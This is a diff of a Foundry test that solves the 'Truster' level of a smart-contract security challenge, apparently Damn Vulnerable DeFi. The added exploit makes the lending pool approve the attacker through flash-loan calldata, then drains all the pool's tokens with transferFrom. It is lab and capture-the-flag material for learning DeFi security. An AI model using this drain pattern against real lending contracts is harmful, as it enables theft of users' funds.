@@ -41,12 +41,22 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        bytes memory datas = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            attacker,
+            TOKENS_IN_POOL
+        );
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), datas);
 
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
         /**
          * EXPLOIT END *
          */
         validation();
-        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        console.log(
+            unicode"\n🎉 Congratulations, you can go to the next level! 🎉"
+        );
     }
 
     function validation() internal {
